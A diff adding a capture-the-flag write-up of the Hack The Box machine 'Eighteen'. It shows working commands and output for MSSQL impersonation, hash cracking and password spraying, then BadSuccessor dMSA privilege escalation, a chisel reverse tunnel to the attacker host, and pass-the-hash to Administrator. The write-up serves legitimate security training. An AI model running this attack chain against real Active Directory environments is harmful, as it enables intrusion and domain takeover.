@@ -1,0 +1,514 @@
+---
+title: 'Eighteen - HTB Writeup'
+date: '2025-12-19'
+description: 'Writeup for HTB challenges "Eighteen".'
+tags: ['Writeup', 'CTF', 'HTB', 'SQL Server', 'Impersonation', 'dMSA', 'BadSuccessor']
+featured: true
+---
+
+# HTB - Eighteen
+
+## Challenge Information
+
+| Property | Value |
+| --- | --- |
+| **IP Address** | 10.129.11.231 |
+| **Description** | As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: `kevin / iNa2we6haRj2gaw!` |
+| **Difficulty** | Easy |
+| **OS** | Windows Server 2025 |
+
+---
+
+## Executive Summary
+
+This box was an interesting journey that took me through SQL Server enumeration, credential discovery via database impersonation, and finally privilege escalation using the **BadSuccessor** vulnerability (dMSA - Delegated Managed Service Account). What made this challenge particularly educational wasn't just the final exploit - it was the series of failures and troubleshooting I went through to understand *why* certain approaches didn't work.
+
+**Final Attack Chain:**
+
+```
+kevin (MSSQL) → appdev (SQL Impersonation) → admin hash (Database) → adam.scott (WinRM) → Administrator (dMSA BadSuccessor)
+
+```
+
+---
+
+## Phase 1: Reconnaissance - Understanding the Attack Surface
+
+### Initial Port Scan
+
+When approaching any box, I always start with a quick port scan to understand what services are available. Speed matters here - I want to get a bird's eye view before diving deep.
+
+```bash
+➜ rustscan -a 10.129.11.231
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
+| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+Open 10.129.11.231:80
+Open 10.129.11.231:1433
+Open 10.129.11.231:5985
+[~] Starting Script(s)
+PORT     STATE SERVICE  REASON
+80/tcp   open  http     syn-ack
+1433/tcp open  ms-sql-s syn-ack
+5985/tcp open  wsman    syn-ack
+
+```
+
+Three open ports - let me break down what this tells me:
+
+- **Port 80 (HTTP)**: A web server, probably IIS on Windows
+- **Port 1433 (MSSQL)**: Microsoft SQL Server - this is interesting because we have credentials
+- **Port 5985 (WinRM)**: Windows Remote Management - that's our shell access if we get valid domain credentials
+
+### Service Version Enumeration
+
+After the quick scan, I ran a more detailed version scan to understand exactly what I'm dealing with:
+
+```bash
+sudo nmap -sS -sV -p 80,1433,5985 10.129.11.231
+Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-12-19 10:00 +07
+Nmap scan report for eighteen.htb (10.129.11.231)
+Host is up (0.061s latency).
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+1433/tcp open  ms-sql-s Microsoft SQL Server
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+```
+
+So we're looking at **Windows Server 2025** with IIS 10.0. That's a relatively new environment. I added the domain to my hosts file immediately:
+
+```bash
+echo "10.129.11.231 eighteen.htb" | sudo tee -a /etc/hosts
+
+```
+
+---
+
+## Phase 2: Web Application Analysis - A Dead End (Sort Of)
+
+### Exploring the Website
+
+I accessed `http://eighteen.htb` and was greeted with what looked like a financial planning application. A clean, professional interface - but that's not always a good sign for finding vulnerabilities.
+
+My first instinct was to try the provided credentials (`kevin / iNa2we6haRj2gaw!`) on the login form. **No luck** - the web credentials weren't the same as the database credentials.
+
+### Directory and Subdomain Enumeration
+
+When a login doesn't work, I hit the enumeration phase:
+
+```bash
+# Directory fuzzing
+ffuf -u <http://eighteen.htb/FUZZ> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# Subdomain fuzzing
+ffuf -u <http://eighteen.htb> -H "Host: FUZZ.eighteen.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+```
+
+**Nothing interesting came up.** At this point, I realized I was probably looking at the wrong door. The challenge gave us database credentials for a reason - time to pivot to MSSQL.
+
+---
+
+## Phase 3: MSSQL Exploitation - The First Foothold
+
+### Connecting to the Database
+
+Here's where things started getting interesting. The provided credentials were meant for SQL Server, not the web app:
+
+```bash
+mssqlclient.py kevin:"iNa2we6haRj2gaw\\!"@eighteen.htb
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+SQL (kevin  guest@master)>
+
+```
+
+**We're in!** And look at that - the server is named `DC01`. That tells me this is likely a Domain Controller. Very interesting.
+
+### Database Enumeration
+
+Now let's see what we can access:
+
+```sql
+SQL (kevin  guest@master)> SELECT @@VERSION;
+Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64)
+	Oct  8 2022 05:58:25
+	Copyright (C) 2022 Microsoft Corporation
+	Enterprise Evaluation Edition (64-bit) on Windows Server 2025 Datacenter 10.0 <X64> (Build 26100: ) (Hypervisor)
+
+SQL (kevin  guest@master)> SELECT name FROM sys.databases;
+name
+-----------------
+master
+tempdb
+model
+msdb
+financial_planner
+
+```
+
+There's a custom database called `financial_planner`. That's definitely our target. But when I tried to access it:
+
+```sql
+SQL (kevin  guest@master)> USE financial_planner
+ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
+
+```
+
+**Access denied.** But here's where my SQL Server knowledge came in handy - I checked for other accounts and their permissions.
+
+### SQL Server Impersonation Attack
+
+Let me find other SQL logins that might have better access:
+
+```sql
+SQL (kevin  guest@master)> SELECT name, is_disabled FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';
+name     is_disabled
+------   -----------
+sa                 0
+kevin              0
+appdev             0
+
+```
+
+There's an `appdev` account! In SQL Server, if a user has `IMPERSONATE` permissions, they can execute queries as another user. Let me try:
+
+```sql
+SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev';
+SQL (appdev  appdev@master)> USE financial_planner;
+ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
+INFO(DC01): Line 1: Changed database context to 'financial_planner'.
+
+```
+
+**It worked!** This is a classic SQL Server misconfuguration - Kevin had permissions to impersonate the appdev account.
+
+### Extracting User Credentials
+
+Now let's see what's in this database:
+
+```sql
+SQL (appdev  appdev@financial_planner)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
+TABLE_NAME
+-----------
+users
+incomes
+expenses
+allocations
+analytics
+visits
+
+SQL (appdev  appdev@financial_planner)> SELECT * FROM users
+  id   full_name   username   email                password_hash                                                                                            is_admin   created_at
+----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------
+1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
+
+```
+
+**Jackpot!** An admin password hash. The format `pbkdf2:sha256:600000$...` tells me this is a Flask/Werkzeug password hash. Let me crack it:
+
+```bash
+hashcat -m 10000 hash.txt rockyou.txt
+
+```
+
+**Cracked password: `iloveyou1`**
+
+---
+
+## Phase 4: Finding a Valid Domain User
+
+### Why the Admin Creds Didn't Work for WinRM
+
+I immediately tried using `admin:iloveyou1` for WinRM access:
+
+```bash
+evil-winrm -i 10.129.11.231 -u admin -p 'iloveyou1'
+# Connection failed
+
+```
+
+This makes sense - `admin` is likely a local application account in the database, not a domain user. I needed to find domain users.
+
+### RID Brute-Force to Enumerate Domain Users
+
+Using NetExec (formerly CrackMapExec), I brute-forced the RIDs to enumerate domain users:
+
+```bash
+➜  nxc mssql 10.129.11.231 -u kevin -p "iNa2we6haRj2gaw\\!" --local-auth --rid-brute
+MSSQL       10.129.11.231   1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
+MSSQL       10.129.11.231   1433   DC01             [+] DC01\\kevin:iNa2we6haRj2gaw!
+MSSQL       10.129.11.231   1433   DC01             500: EIGHTEEN\\Administrator
+MSSQL       10.129.11.231   1433   DC01             502: EIGHTEEN\\krbtgt
+MSSQL       10.129.11.231   1433   DC01             1601: EIGHTEEN\\mssqlsvc
+MSSQL       10.129.11.231   1433   DC01             1606: EIGHTEEN\\jamie.dunn
+MSSQL       10.129.11.231   1433   DC01             1607: EIGHTEEN\\jane.smith
+MSSQL       10.129.11.231   1433   DC01             1608: EIGHTEEN\\alice.jones
+MSSQL       10.129.11.231   1433   DC01             1609: EIGHTEEN\\adam.scott
+MSSQL       10.129.11.231   1433   DC01             1610: EIGHTEEN\\bob.brown
+MSSQL       10.129.11.231   1433   DC01             1611: EIGHTEEN\\carol.white
+MSSQL       10.129.11.231   1433   DC01             1612: EIGHTEEN\\dave.green
+
+```
+
+Now I have a list of domain users! My theory: maybe one of them reuses the password `iloveyou1` from the web application admin account.
+
+### Password Spraying
+
+I tried each domain user with the cracked password:
+
+```bash
+evil-winrm -i 10.129.11.231 -u adam.scott -p 'iloveyou1'
+
+```
+
+**Success!** User `adam.scott` uses `iloveyou1` as their password. Password reuse strikes again.
+
+---
+
+## Phase 5: User Flag and Initial Enumeration
+
+### Getting the User Flag
+
+```powershell
+*Evil-WinRM* PS C:\\Users\\adam.scott\\Documents> type ../Desktop/user.txt
+639[REDACTED]3f4
+
+```
+
+**User flag captured!** Now onto the real challenge - privilege escalation to Administrator.
+
+---
+
+## Phase 6: Privilege Escalation Research
+
+### Understanding the Environment
+
+Before blindly running scripts, I wanted to understand what I'm dealing with. This is Windows Server 2025 - one of the newest Windows Server versions. That means:
+
+1. Most classic privesc techniques are likely patched
+2. New features might introduce new attack vectors
+3. I should look for modern vulnerabilities
+
+### Discovering BadSuccessor (dMSA Abuse)
+
+After some research on Windows Server 2025 privilege escalation, I came across **CVE-2025-21293** (BadSuccessor). This vulnerability abuses **Delegated Managed Service Accounts (dMSA)** - a new feature in Windows Server 2025.
+
+**Here's why this vulnerability is interesting:**
+
+When a dMSA is configured with the `msDS-ManagedAccountPrecededByLink` attribute pointing to another account (like Administrator), the dMSA can retrieve the NT hash of that account. The vulnerability exists because any user who can create objects in an OU can create a dMSA that claims to be the "successor" to the Administrator account.
+
+---
+
+## Phase 7: The Struggle - Learning Through Failure
+
+This is where I want to be honest about my journey. The final exploit looks simple in hindsight, but I went through several failures before getting it right. These failures taught me a lot about how dMSA works.
+
+### Failure 1: Rubeus `/dmsa` Flag - KDC_ERR_S_PRINCIPAL_UNKNOWN
+
+My first attempt was using Rubeus, a well-known Kerberos exploitation tool:
+
+```powershell
+.\\Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap /ticket:$adamtgt
+
+[X] KRB-ERROR (7) : KDC_ERR_S_PRINCIPAL_UNKNOWN
+
+```
+
+**Why did this fail?** The error `KDC_ERR_S_PRINCIPAL_UNKNOWN` indicates the KDC couldn't find the service principal. I tried troubleshooting:
+
+- Added SPNs to the dMSA (`HOST/attacker_dMSA`, `HOST/attacker_dMSA.eighteen.htb`)
+- Verified `msDS-DelegatedMSAState = 2` (Active state)
+- Confirmed `msDS-ManagedAccountPrecededByLink` pointed to Administrator
+
+None of it worked. The issue was that Rubeus's `/dmsa` implementation (v2.2.0) doesn't properly handle all dMSA scenarios. The S4U mechanism requires specific conditions that weren't being met by Rubeus in this environment.
+
+### Failure 2: Direct LDAP Read of msDS-ManagedPassword
+
+I thought maybe I could just read the managed password attribute directly via LDAP:
+
+```powershell
+$dMSA = [ADSI]"LDAP://CN=attacker_dMSA2,OU=Staff,DC=eighteen,DC=htb"
+$pwdBlob = $dMSA.Properties['msds-managedpassword']
+# Result: Blob is null/empty!
+
+```
+
+**Why did this fail?** The `msDS-ManagedPassword` is a **constructed attribute**. This means Active Directory only generates it on-the-fly when:
+
+1. The requesting principal is in `PrincipalsAllowedToRetrieveManagedPassword`
+2. The request uses the proper Kerberos authentication context
+
+Simple LDAP queries from WinRM don't use the right authentication delegation to trigger this construction.
+
+### Failure 3: Incorrect PrincipalsAllowedToRetrieveManagedPassword
+
+When I used `Invoke-BadSuccessor.ps1`, it was setting the wrong principal:
+
+```powershell
+# What the script set:
+-PrincipalsAllowedToRetrieveManagedPassword $machine.SamAccountName  # Pwn$
+
+# What I actually needed:
+-PrincipalsAllowedToRetrieveManagedPassword $currentUser  # adam.scott
+
+```
+
+The script was allowing a machine account `Pwn$` to retrieve the password, but I was authenticating as `adam.scott`. **The lesson:** Always verify that YOUR user is the one allowed to retrieve the managed password.
+
+### Failure 4: Impacket Network Connectivity
+
+When I switched to using Impacket's `getST.py`, I hit another wall:
+
+```bash
+getST.py -impersonate 'evil1$' -dmsa -dc-ip 10.129.11.231 ...
+# [Errno Connection error (10.129.11.231:88)] [Errno 111] Connection refused
+
+```
+
+Port 88 (Kerberos) wasn't directly accessible from my machine! HTB's network topology only allowed connections through established sessions. I needed to tunnel my traffic through the WinRM session.
+
+---
+
+## Phase 8: The Successful Exploitation Path
+
+After all those failures, here's what finally worked:
+
+### Step 1: Create dMSA with SharpSuccessor
+
+`SharpSuccessor.exe` is a C# tool specifically designed for this attack. It properly creates the dMSA with all necessary attributes:
+
+```powershell
+.\\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=Staff,DC=eighteen,DC=htb" /account:adam.scott /name:evil1
+
+```
+
+This created `evil1$` dMSA with:
+
+- `msDS-ManagedAccountPrecededByLink` → Administrator (the target we want to impersonate)
+- `PrincipalsAllowedToRetrieveManagedPassword` → adam.scott (our current user)
+
+### Step 2: Set Up Chisel Reverse Tunnel
+
+Since I couldn't directly access the DC's Kerberos port (88) from my attacker machine, I needed to tunnel through the victim:
+
+**On my Linux attacker machine:**
+
+```bash
+/tmp/chisel server -p 8880 --reverse
+
+```
+
+> Important: The --reverse flag is required on the server to enable reverse port forwarding! I wasted 30 minutes debugging because I forgot this flag the first time.
+> 
+
+**On the Windows victim (via evil-winrm):**
+
+```powershell
+Start-Job -ScriptBlock {
+    cd C:\\Users\\adam.scott\\Documents
+    .\\chisel.exe client 10.10.14.16:8880 R:8088:127.0.0.1:88 R:8389:127.0.0.1:389
+}
+
+```
+
+This creates reverse tunnels:
+
+- Port 8088 on my machine → Port 88 on the DC (Kerberos)
+- Port 8389 on my machine → Port 389 on the DC (LDAP)
+
+### Step 3: Socat for Privileged Ports
+
+Here's a Linux problem: ports below 1024 require root privileges. Impacket expects to connect to port 88, but Chisel is listening on 8088. Solution: use `socat` to redirect:
+
+```bash
+sudo apt-get install -y socat
+
+sudo $(which socat) TCP-LISTEN:88,fork,reuseaddr TCP:127.0.0.1:8088 &
+sudo $(which socat) TCP-LISTEN:389,fork,reuseaddr TCP:127.0.0.1:8389 &
+
+```
+
+**Traffic flow now looks like:**
+
+```
+Impacket (127.0.0.1:88)
+    → socat (88 → 8088)
+    → chisel tunnel (8088)
+    → victim (127.0.0.1:88)
+    → DC Kerberos service
+
+```
+
+### Step 4: Sync Time with Target
+
+Kerberos is extremely time-sensitive - there's a maximum 5-minute skew allowed. If your clock is off, all Kerberos requests will fail:
+
+```bash
+sudo date -s "$(curl -s -I <http://10.129.11.231> | grep -i '^Date:' | sed 's/Date: //')"
+
+```
+
+### Step 5: Update /etc/hosts for Tunneled Traffic
+
+Since traffic is now going through localhost, I needed to update my hosts file:
+
+```bash
+echo "127.0.0.1 eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
+
+```
+
+### Step 6: Execute the dMSA Attack with Impacket
+
+Now everything is in place. Let's get that Administrator hash:
+
+```bash
+getST.py -impersonate 'evil1$' -dmsa -dc-ip 127.0.0.1 -spn ldap/dc01.eighteen.htb eighteen.htb/adam.scott:iloveyou1
+
+```
+
+**Output:**
+
+```
+[*] Getting TGT for user
+[*] Impersonating evil1$
+[*] Requesting S4U2self
+[*] Current keys:
+[*] EncryptionTypes.aes256_cts_hmac_sha1_96:e06fc6f0e66280624ae5b23f1093d8de5304808db5c773bb55582bcbe069fb93
+[*] EncryptionTypes.aes128_cts_hmac_sha1_96:ece14eb514ad3ed06f7df81620baf1b6
+[*] EncryptionTypes.rc4_hmac:cfc8814dc252d6c03868379789dc4185
+[*] Previous keys:
+[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec  ← Administrator NT Hash!
+
+```
+
+**The `Previous keys` section contains the Administrator's NT hash!** This is because when the dMSA "succeeds" Administrator, it retains the previous account's keys.
+
+### Step 7: Pass-the-Hash to Administrator
+
+With the NT hash, I can authenticate as Administrator using Pass-the-Hash:
+
+```bash
+evil-winrm -i 10.129.11.231 -u Administrator -H 0b133be956bfaddf9cea56701affddec
+
+```
+
+### Step 8: Getting the Root Flag
+
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
+
+```
+
+**Root flag captured!**
